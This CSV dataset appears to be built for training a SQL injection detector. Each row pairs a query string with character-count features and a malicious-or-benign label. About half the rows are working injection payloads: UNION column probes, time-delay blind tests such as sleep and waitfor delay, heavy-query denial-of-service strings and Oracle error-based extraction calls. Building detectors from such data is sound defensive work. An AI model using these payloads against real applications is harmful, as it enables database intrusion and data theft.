Query,single_comments,logical_operators,arithmetic_operators,drop,union,special_chars,equal,delimiter,dot,whitespaces,digits,alphabets,brackets,nulls,hexadecimal,commas,single_quotes,double_quotes,Label
43120,0,0,0,0,0,0,0,0,5,0,5,0,0,0,0,0,0,0,0
SELECT * FROM carefully FETCH FIRST 3 ROWS ONLY,0,0,0,0,0,0,0,0,47,8,1,9,0,0,0,0,0,0,0
alfeiza,0,0,0,0,0,0,0,0,7,0,0,7,0,0,0,0,0,0,0
SELECT * FROM group WHERE figure = 'vapor' LIMIT 3,0,0,0,0,0,0,1,0,50,9,1,16,0,0,0,0,2,0,0
"pasaje cesar arbasia, 99, 3-a",0,0,1,0,0,0,0,0,29,4,3,19,0,0,0,2,0,0,0
SELECT AVG ( last ) FROM tonight SELECT SUM ( make ) ,0,0,0,0,0,0,0,0,53,12,0,15,4,0,0,0,0,0,0
zahnley,0,0,0,0,0,0,0,0,7,0,0,7,0,0,0,0,0,0,0
"-4152""  )   where 9781  =  9781 union all select 9781,9781,9781,9781,9781--",1,0,3,0,1,0,1,0,75,14,32,19,1,0,0,4,0,1,1
"1%'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  '%'  =  '",0,5,0,0,0,2,2,0,203,84,27,56,18,1,0,3,4,0,1
" SELECT * FROM usual ORDER BY willing, lift",0,0,0,0,0,0,0,0,43,8,0,16,0,0,0,1,0,0,0
"paseo mokamer, s/n,",0,0,0,0,0,0,0,0,19,2,0,14,0,0,0,2,0,0,0
1   )    )     )   and 2006  =  2006,0,1,0,0,0,0,1,0,36,20,9,3,3,0,0,0,0,0,1
autonell,0,0,0,0,0,0,0,0,8,0,0,8,0,0,0,0,0,0,0
4.79638E+15,0,0,1,0,0,0,0,0,11,0,8,0,0,0,0,0,0,0,0
kuzz,0,0,0,0,0,0,0,0,4,0,0,4,0,0,0,0,0,0,0
1   )    )    as trin where 8843  =  8843,0,0,0,0,0,0,1,0,41,18,9,11,2,0,0,0,0,0,1
"-3626%""  )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  ""%""  =  """,0,12,1,0,0,2,3,0,361,170,48,77,34,0,0,0,0,4,1
SELECT * FROM story FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM monkey,0,0,0,0,0,0,0,0,79,15,3,11,0,0,0,0,0,0,0
"  SELECT * FROM directly WHERE hard NOT IN  ( 'lucky', 'bottom', 'earth' )  ",0,0,0,0,0,0,0,0,76,17,0,28,2,0,0,2,6,0,0
SELECT * FROM eventually 3 SELECT * FROM held,0,0,0,0,0,0,0,0,45,8,1,14,0,0,0,0,0,0,0
"1""  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  ""dppw"" like ""dppw",0,2,0,0,0,0,1,0,151,42,10,78,6,0,0,4,0,4,1
p0n64793a,0,0,0,0,0,0,0,0,9,0,6,3,0,0,0,0,0,0,0
SELECT * FROM measure WHERE too = 'beginning' FETCH FIRST 3 ROWS ONLY,0,0,0,0,0,0,1,0,69,12,1,19,0,0,0,0,2,0,0
"   SELECT recently,running,light,house,birth     (  (  onto JOIN nodded ON animal.held =  arrive.whom )   INNER JOIN olderON Orders.allow =  pair.awayID ) ",0,0,0,0,0,0,2,0,155,32,0,83,4,0,0,4,0,0,0
SELECT * FROM dozen  WHERE screen NOT LIKE '[combination]%',0,0,0,0,0,1,0,0,59,9,0,22,2,0,0,0,2,0,0
"1  )   where 2781  =  2781 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1,2,0,0,0,2,0,144,40,18,67,5,0,0,4,0,0,1
SELECT shine ( s FROM can RIGHT JOIN,0,0,0,0,0,0,0,0,36,7,0,9,1,0,0,0,0,0,0
SELECT COUNT ( softID ) FROM top,0,0,0,0,0,0,0,0,32,6,0,7,2,0,0,0,0,0,0
5.95639E+15,0,0,1,0,0,0,0,0,11,0,8,0,0,0,0,0,0,0,0
23531966e,0,0,0,0,0,0,0,0,9,0,8,1,0,0,0,0,0,0,0
SELECT * FROM policeman WHERE happen LIKE '%suddenly%',0,0,0,0,0,2,0,0,54,7,0,23,0,0,0,0,2,0,0
"1   )    )     )   union all select null,null--",1,0,2,0,1,0,0,0,47,18,1,22,3,2,0,1,0,0,1
SELECT * FROM mirror WHERE attached BETWEEN '1996-07-01' AND '1996-07-31',0,0,4,0,0,0,0,0,73,9,16,14,0,0,0,0,4,0,0
"   SELECT sort,end,gradually,pilot,consider     (  (  train JOIN drop ON phrase.nice =  smooth.belong )   INNER JOIN dangerousON Orders.curious =  circle.systemID ) ",0,0,0,1,0,0,2,0,165,32,0,93,4,0,0,4,0,0,0
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'cwuy'  =  'cwuy",0,1,0,0,0,0,1,0,115,43,10,46,8,0,0,1,5,0,1
SELECT * FROM thank 3 SELECT * FROM go,0,0,0,0,0,0,0,0,38,8,1,7,0,0,0,0,0,0,0
estic o'neil,0,0,0,0,0,0,0,0,12,1,0,10,0,0,0,0,1,0,0
-4828%'  )   or 8678  =  5745#,0,1,1,0,0,1,1,0,30,10,12,2,1,0,0,0,1,0,1
SELECT * FROM popular WHERE grandfather = 'after' FETCH FIRST 3 ROWS ONLY,0,0,0,0,0,0,1,0,73,12,1,23,0,0,0,0,2,0,0
"1'+  (  select 'ejox' where 2719  =  2719 union all select null,null,null#",0,0,1,0,1,0,1,0,74,15,9,41,1,3,0,2,3,0,1
SELECT COUNT ( fliesID ) FROM grandfather,0,0,0,0,0,0,0,0,41,6,0,16,2,0,0,0,0,0,0
boniquet jeria,0,0,0,0,0,0,0,0,14,1,0,13,0,0,0,0,0,0,0
SELECT AVG ( production ) FROM list SELECT SUM ( wooden ) ,0,0,0,0,0,0,0,0,58,12,0,20,4,0,0,0,0,0,0
"select sleep  (  5  )   and   (  ""innk""  =  ""innk",0,1,0,0,0,0,1,0,49,19,1,22,3,0,0,0,0,3,1
SELECT * FROM complex WHERE Price NOT BETWEEN 10 AND 20,0,0,0,0,0,0,0,0,55,10,4,11,0,0,0,0,0,0,0
SELECT * FROM bone WHERE NOT west = 'pain'  AND NOT shake = 'around',0,0,0,0,0,0,2,0,68,14,0,23,0,0,0,0,4,0,0
"1   )    )    or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,1,2,0,0,0,1,0,115,52,15,31,10,0,0,1,2,0,1
SELECT * FROM worker WHERE heading = 'due' FETCH FIRST 3 ROWS ONLY,0,0,0,0,0,0,1,0,66,12,1,16,0,0,0,0,2,0,0
"1%""  )   and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,1,2,0,0,1,1,0,181,43,12,109,5,0,0,6,0,1,1
"el reyezuelo, 15",0,0,0,0,0,0,0,0,16,2,2,11,0,0,0,1,0,0,0
antirreglamentaria,0,0,0,0,0,0,0,0,18,0,0,18,0,0,0,0,0,0,0
anguita,0,0,0,0,0,0,0,0,7,0,0,7,0,0,0,0,0,0,0
1 where 8102  =  8102 and 9198  =  9198--,1,1,2,0,0,0,2,0,41,12,17,8,0,0,0,0,0,0,1
"SELECT t.*, tt.* FROM wp_terms AS t INNER JOIN wp_term_taxonomy AS tt ON t.term_id  =  tt.term_id WHERE tt.taxonomy IN  ( 'support_cat' )  AND t.term_id IN  (  2637  ) ",0,0,0,0,0,0,1,0,168,35,4,69,4,0,0,1,2,0,0
1' and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     ) ,0,11,0,0,0,0,2,0,336,143,45,91,30,0,0,0,1,0,1
patchsqa,0,0,0,0,0,0,0,0,8,0,0,8,0,0,0,0,0,0,0
SELECT AVG ( favorite ) FROM softly,0,0,0,0,0,0,0,0,35,6,0,14,2,0,0,0,0,0,0
1'   )    )    as hqhs where 5383  =  5383,0,0,0,0,0,0,1,0,42,18,9,11,2,0,0,0,1,0,1
"   SELECT clear,carbon,bottle,ranch,research     (  (  scared JOIN clearly ON vertical.mass =  president.valley )   INNER JOIN brokenON Orders.copper =  vertical.arrowID ) ",0,0,0,0,0,0,2,0,172,32,0,100,4,0,0,4,0,0,0
"1  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  5098  =  5098",0,2,0,0,0,0,2,0,146,44,18,66,6,0,0,4,0,0,1
"1,  (  select   (  case when   (  3902  =  3902  )   then   (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   else 1/  (  select 0 from dual  )   end  )   from dual  )  ",0,0,0,0,0,0,1,0,221,73,16,107,12,0,0,5,0,0,1
"-1370'   )    )     )   or elt  (  1032  =  1032,3623  )   and    (    (     (  'xmrg'  =  'xmrg",0,2,1,0,0,0,2,0,96,48,16,16,8,0,0,1,4,0,1
"1   )    )    or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   5336  =  5336",0,5,0,0,0,0,2,0,215,96,32,55,20,1,0,3,0,0,1
"1""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",0,0,0,0,0,0,0,0,87,43,2,30,9,0,0,0,0,1,1
SELECT option_value FROM wp_options WHERE option_name  =  '_options_site_logo' LIMIT 1,0,0,0,0,0,0,1,0,86,11,1,45,0,0,0,0,2,0,0
"1'  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",0,11,0,0,0,0,2,0,333,146,49,81,31,0,0,1,1,0,1
nogueras,0,0,0,0,0,0,0,0,8,0,0,8,0,0,0,0,0,0,0
SELECT tool FROM coffee,0,0,0,0,0,0,0,0,23,3,0,10,0,0,0,0,0,0,0
"1' and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  ",0,4,0,0,0,0,1,0,121,46,16,37,10,0,0,1,1,0,1
SELECT bring ( s )  FROM alphabet LEFT JOIN,0,0,0,0,0,0,0,0,43,9,0,14,2,0,0,0,0,0,0
"  SELECT TIMEDIFF ( ""2017-06-25 13:10:11"", ""2017-06-15 13:10:10"" ) ;",0,0,4,0,0,0,0,1,68,10,28,0,2,0,0,1,0,4,0
"-9505'   )    )     )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  'qhdg'  =  'qhdg",0,12,1,0,0,0,3,0,386,176,52,91,36,0,0,1,4,0,1
"1'   )    )    as fwhv where 3921  =  3921 union all select null,null--",1,0,2,0,1,0,1,0,71,22,9,33,2,2,0,1,1,0,1
SELECT * FROM friend 3 SELECT * FROM percent,0,0,0,0,0,0,0,0,44,8,1,13,0,0,0,0,0,0,0
-2658  )   as casi where 7364  =  7364 or 8245  =  9651--,1,1,3,0,0,0,2,0,57,18,20,13,1,0,0,0,0,0,1
SELECT * FROM fill WHERE want = 'fellow'  OR mad = 'making',0,0,0,0,0,0,2,0,59,12,0,23,0,0,0,0,4,0,0
concursado,0,0,0,0,0,0,0,0,10,0,0,10,0,0,0,0,0,0,0
"   SELECT cattle, post, sidesFROM breathing WHERE tropical  IS NOT NULL",0,0,0,0,0,0,0,0,71,13,0,32,0,0,0,2,0,0,0
"   SELECT laid,primitive,pass,education,above     (  (  select JOIN cross ON roll.indicate =  notice.region )   INNER JOIN typicalON Orders.pound =  aid.filmID ) ",0,0,0,0,0,0,2,0,162,32,0,90,4,0,0,4,0,0,0
gomska.hopper@ebuy.com.bi,0,0,0,0,0,1,0,0,25,0,0,21,0,0,0,0,0,0,0
"   SELECT cast, wealth+ ', ' + neighborhood+ ' ' + thousand+ ', ' + worried AS upper  FROM sharp",0,0,6,0,0,0,0,0,96,22,0,47,0,0,0,3,6,0,0
-2733'   )    )     )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  'btjx'  =  'btjx,0,15,1,0,0,0,3,0,454,211,54,111,44,0,0,0,4,0,1
SELECT * FROM lack WHERE dark LIKE '%effort%',0,0,0,0,0,2,0,0,45,7,0,14,0,0,0,0,2,0,0
"1""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""cneo"" like ""cneo",0,1,0,0,0,0,0,0,113,51,2,45,10,0,0,0,0,4,1
"calle puruuela, 15 6?d",0,0,0,0,0,1,0,0,22,3,3,14,0,0,0,1,0,0,0
DELETE FROM tail,0,0,0,0,0,0,0,0,16,2,0,4,0,0,0,0,0,0,0
"  SELECT * FROM hang WHERE fifteen NOT IN  ( 'three', 'speech', 'furniture' )  ",0,0,0,0,0,0,0,0,79,17,0,31,2,0,0,2,6,0,0
SELECT * FROM thread WHERE strong NOT LIKE 'any%',0,0,0,0,0,1,0,0,49,8,0,15,0,0,0,0,2,0,0
29500,0,0,0,0,0,0,0,0,5,0,5,0,0,0,0,0,0,0,0
"1'   )    )     )   union all select null,null,null,null,null,null,null,null,null--",1,0,2,0,1,0,0,0,83,18,1,50,3,9,0,8,1,0,1
"-9947""   )    )     )   union all select 8765,8765,8765,8765,8765#",0,0,1,0,1,0,0,0,66,18,24,14,3,0,0,4,0,1,1
SELECT TOP 50 PERCENT * FROM chamber SELECT * FROM land FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM triangle,0,0,0,0,0,0,0,0,116,21,5,19,0,0,0,0,0,0,0
"  SELECT DAYNAME ( ""2017-06-15"" ) ;",0,0,2,0,0,0,0,1,35,7,8,0,2,0,0,0,0,2,0
massie.borionko@13horas.gr,0,0,0,0,0,1,0,0,26,0,2,21,0,0,0,0,0,0,0
cecon5,0,0,0,0,0,0,0,0,6,0,1,5,0,0,0,0,0,0,0
SELECT * FROM underline 3,0,0,0,0,0,0,0,0,25,4,1,9,0,0,0,0,0,0,0
"1""   )    )     )   and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (     (  ""felm""  =  ""felm",0,2,0,0,0,0,2,0,107,58,10,22,10,0,0,1,0,4,1
"1' where 1895  =  1895 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1,2,0,0,0,2,0,140,36,18,67,4,0,0,4,1,0,1
9ar5i04o,0,0,0,0,0,0,0,0,8,0,4,4,0,0,0,0,0,0,0
karzau@asdn.edu,0,0,0,0,0,1,0,0,15,0,0,13,0,0,0,0,0,0,0
1'  )   as eyzk where 2489  =  2489 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,1,11,2,0,0,0,3,0,358,146,53,100,29,0,0,0,1,0,1
1' where 8128  =  8128,0,0,0,0,0,0,1,0,22,6,9,5,0,0,0,0,1,0,1
brihuega,0,0,0,0,0,0,0,0,8,0,0,8,0,0,0,0,0,0,0
"buidaoli, 49, 12-g",0,0,1,0,0,0,0,0,18,2,4,9,0,0,0,2,0,0,0
"1%""   )    )     )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  ""%""  =  """,0,2,0,0,0,2,2,0,221,73,12,111,10,0,0,6,0,4,1
SELECT composed ( s )  FROM how FULL OUTER JOIN,0,0,0,0,0,0,0,0,47,10,0,12,2,0,0,0,0,0,0
"1""  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  ""dwpa""  =  ""dwpa",0,5,0,0,0,0,2,0,151,60,16,47,12,0,0,1,0,4,1
SELECT * FROM thee WHERE feet = 'cabin' FETCH FIRST 3 ROWS ONLY,0,0,0,0,0,0,1,0,63,12,1,13,0,0,0,0,2,0,0
"  SELECT Orders.welcomerID, Employees.uncle, Employees.somebody FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.directlyID ORDER BY Orders.wifeID",0,0,0,0,0,0,1,0,164,18,0,92,0,0,0,2,0,0,0
SELECT option_value FROM wp_options WHERE option_name  =  '_options_linkedin_url' LIMIT 1,0,0,0,0,0,0,1,0,89,11,1,48,0,0,0,0,2,0,0
SELECT * FROM window WHERE coffee = 'tide',0,0,0,0,0,0,1,0,42,7,0,16,0,0,0,0,2,0,0
SELECT AVG ( loud )  FROM chance  SELECT SUM ( mice ) ,0,0,0,0,0,0,0,0,54,14,0,14,4,0,0,0,0,0,0
p44m8scu6916n,0,0,0,0,0,0,0,0,13,0,7,6,0,0,0,0,0,0,0
" select * from users where id  =  1 or ""1#"" or 1  =  1 -- 1",1,2,2,0,0,0,2,0,59,20,5,26,0,0,0,0,0,2,1
"  SELECT roof,glass,tomorrow FROM he LEFT JOIN Orders ON plates.familiarID =  life.ate ORDER BY enter.composed",0,0,0,0,0,0,1,0,110,16,0,58,0,0,0,2,0,0,0
34578974s,0,0,0,0,0,0,0,0,9,0,8,1,0,0,0,0,0,0,0
"-1275"" union all select 7861,7861,7861,7861,7861#",0,0,1,0,1,0,0,0,49,4,24,14,0,0,0,4,0,1,1
SELECT * FROM salmon  WHERE principal NOT LIKE '[his]%',0,0,0,0,0,1,0,0,55,9,0,18,2,0,0,0,2,0,0
SELECT * FROM fed WHERE lion = 'cowboy' LIMIT 3,0,0,0,0,0,0,1,0,47,9,1,13,0,0,0,0,2,0,0
1 and   (  1977  =  6852  )  *6852-- clxl,1,1,2,0,0,0,1,0,41,15,13,7,2,0,0,0,0,0,1
"-6017 union all select 8449,8449,8449--",1,0,3,0,1,0,0,0,39,4,16,14,0,0,0,2,0,0,1
" select * from users where id  =  1 union select 1`\`,version  (    )   -- 1",1,0,2,0,1,0,1,0,76,23,3,40,2,0,0,1,0,0,1
SELECT * FROM cold WHERE ask BETWEEN 'wolf' AND 'numeral',0,0,0,0,0,0,0,0,57,9,0,18,0,0,0,0,4,0,0
"1   )    )    and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (   6010  =  6010",0,5,0,0,0,0,2,0,162,72,24,40,14,0,0,1,0,0,1
SELECT AVG ( Price ) FROM dark,0,0,0,0,0,0,0,0,30,6,0,8,2,0,0,0,0,0,0
zobelda,0,0,0,0,0,0,0,0,7,0,0,7,0,0,0,0,0,0,0
62128531b,0,0,0,0,0,0,0,0,9,0,8,1,0,0,0,0,0,0,0
SELECT AVG ( labor )  FROM mark  SELECT SUM ( writer ) ,0,0,0,0,0,0,0,0,55,14,0,15,4,0,0,0,0,0,0
7.36777E+15,0,0,1,0,0,0,0,0,11,0,8,0,0,0,0,0,0,0,0
SELECT * FROM chamber WHERE brave  BETWEEN 10 AND 20,0,0,0,0,0,0,0,0,52,10,4,12,0,0,0,0,0,0,0
SELECT DISTINCT citizen FROM everywhere,0,0,0,0,0,0,0,0,39,4,0,17,0,0,0,0,0,0,0
06434691g,0,0,0,0,0,0,0,0,9,0,8,1,0,0,0,0,0,0,0
"  SELECT dinnerID AS ID, stranger AS language FROM heavy",0,0,0,0,0,0,0,0,56,10,0,27,0,0,0,1,0,0,0
"camino del caliero, 75",0,0,0,0,0,0,0,0,22,3,2,16,0,0,0,1,0,0,0
SELECT nice FROM arrive UNION ALL SELECT enemy FROM immediately ORDER BY such,0,0,0,0,0,0,0,0,77,12,0,30,0,0,0,0,0,0,0
DELETE FROM physical,0,0,0,0,0,0,0,0,20,2,0,8,0,0,0,0,0,0,0
39152269j,0,0,0,0,0,0,0,0,9,0,8,1,0,0,0,0,0,0,0
"1%""   )    )     )   union all select null,null,null,null#",0,0,0,0,1,1,0,0,58,18,1,30,3,4,0,3,0,1,1
SELECT TOP 3 * FROM somehow,0,0,0,0,0,0,0,0,27,5,1,7,0,0,0,0,0,0,0
 (  case when 8422  =  8452 then 1 else null end  ) ,0,0,0,0,0,0,1,0,52,17,9,23,2,1,0,0,0,0,1
19583,0,0,0,0,0,0,0,0,5,0,5,0,0,0,0,0,0,0,0
"1%'  )   union all select null,null,null#",0,0,0,0,1,1,0,0,41,8,1,26,1,3,0,2,1,0,1
tyler,0,0,0,0,0,0,0,0,5,0,0,5,0,0,0,0,0,0,0
SELECT * FROM accurate WHERE camp BETWEEN '1996-07-01' AND '1996-07-31',0,0,4,0,0,0,0,0,71,9,16,12,0,0,0,0,4,0,0
"1"" where 4808  =  4808 union all select null,null,null,null,null,null,null#",0,0,0,0,1,0,1,0,75,10,9,47,0,7,0,6,0,1,1
ru5runears2,0,0,0,0,0,0,0,0,11,0,2,9,0,0,0,0,0,0,0
SELECT COUNT ( ProductID ) FROM Products;,0,0,0,0,0,0,0,1,41,6,0,13,2,0,0,0,0,0,0
SELECT * FROM usually WHERE least = 'addition' FETCH FIRST 3 ROWS ONLY,0,0,0,0,0,0,1,0,70,12,1,20,0,0,0,0,2,0,0
de2ape91ibi1ie4to,0,0,0,0,0,0,0,0,17,0,5,12,0,0,0,0,0,0,0
SELECT COUNT ( whenever )  FROM proper,0,0,0,0,0,0,0,0,38,7,0,14,2,0,0,0,0,0,0
SELECT * FROM master WHERE at = 'baseball',0,0,0,0,0,0,1,0,42,7,0,16,0,0,0,0,2,0,0
"   SELECT Employees.laugh, COUNT ( Orders.orderID )  AS globeFROM    ( OrdersINNER JOIN generally ON Orders.mayID  =  Employees.meltedID ) ",0,0,0,0,0,0,1,0,139,26,0,64,4,0,0,1,0,0,0
SELECT * FROM corn WHERE offer = 'atom' FETCH FIRST 3 ROWS ONLY,0,0,0,0,0,0,1,0,63,12,1,13,0,0,0,0,2,0,0
SELECT AVG ( outline ) FROM garage,0,0,0,0,0,0,0,0,34,6,0,13,2,0,0,0,0,0,0
83360974g,0,0,0,0,0,0,0,0,9,0,8,1,0,0,0,0,0,0,0
"1'+  (  select tvpj where 7058  =  7058 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  +'",0,1,2,0,0,0,2,0,146,57,23,46,10,0,0,1,4,0,1
FROM  ( SELECT DISTINCT way FROM area ) ,0,0,0,0,0,0,0,0,40,9,0,7,2,0,0,0,0,0,0
os,0,0,0,0,0,0,0,0,2,0,0,2,0,0,0,0,0,0,1
SELECT * FROM organized WHERE trunk  BETWEEN 10 AND 20,0,0,0,0,0,0,0,0,54,10,4,14,0,0,0,0,0,0,0
vilanova de arousa,0,0,0,0,0,0,0,0,18,2,0,16,0,0,0,0,0,0,0
1  )   where 6884  =  6884 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,1,1,12,0,0,0,2,0,355,168,55,83,35,0,0,0,0,0,1
"1""  )   as eaxo where 2728  =  2728",0,0,0,0,0,0,1,0,35,12,9,11,1,0,0,0,0,1,1
"madrid, 27",0,0,0,0,0,0,0,0,10,1,2,6,0,0,0,1,0,0,0
10970,0,0,0,0,0,0,0,0,5,0,5,0,0,0,0,0,0,0,0
odelsia,0,0,0,0,0,0,0,0,7,0,0,7,0,0,0,0,0,0,0
522,0,0,0,0,0,0,0,0,3,0,3,0,0,0,0,0,0,0,0
select   (  case when   (  8978  =  1426  )   then 1 else 8978*  (  select 8978 from master..sysdatabases  )   end  )  --,1,0,2,0,0,0,1,0,121,39,17,53,6,0,0,0,0,0,1
"-8093""   )    )    as oboi where 1476  =  1476 union all select 1476,1476,1476,1476#",0,0,1,0,1,0,1,0,84,22,28,25,2,0,0,3,0,1,1
waitfor delay '0:0:5' and   (  4614  =  4614,0,1,0,0,0,0,1,0,44,12,11,15,1,0,0,0,2,0,1
"1'   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'hfqz'  =  'hfqz",0,2,0,0,0,0,2,0,160,57,8,75,8,0,0,2,4,0,1
" SELECT FIELD ( 5, 0, 1, 2, 3, 4, 5 ) ;",0,0,0,0,0,0,0,1,39,12,7,0,2,0,0,6,0,0,0
"INSERT INTO thirty ( stems, prepare, sure, lovely, surface, food )  VALUES  ( 'cap', 'view'. official', 'learn', 'buffalo', 'giant', 'fish' )  ",0,0,0,0,0,0,0,0,143,24,0,75,4,0,0,10,13,0,0
mascarino.marenghi@cocheacoche.lv,0,0,0,0,0,1,0,0,33,0,0,30,0,0,0,0,0,0,0
1%'  )   and   (  7704  =  3494  )  *3494 and   (  '%'  =  ',0,2,0,0,0,2,2,0,60,28,13,6,4,0,0,0,4,0,1
SELECT lunch ( s FROM dead RIGHT JOIN,0,0,0,0,0,0,0,0,37,7,0,10,1,0,0,0,0,0,0
select sleep  (  5  )   and    (    (     (  8354  =  8354,0,1,0,0,0,0,1,0,58,29,9,14,5,0,0,0,0,0,1
SELECT * FROM  ( SELECT bell FROM shoot ) ,0,0,0,0,0,0,0,0,42,10,0,9,2,0,0,0,0,0,0
" select * from users where id  =  1 ||1 union select null,banner from v$version where rownum  =  1 -- 1",1,1,2,0,1,0,2,0,103,24,4,66,0,1,0,1,0,0,1
"  SELECT * FROM cat WHERE member IN  ( 'sum', 'harbor', 'edge' )  ",0,0,0,0,0,0,0,0,66,16,0,22,2,0,0,2,6,0,0
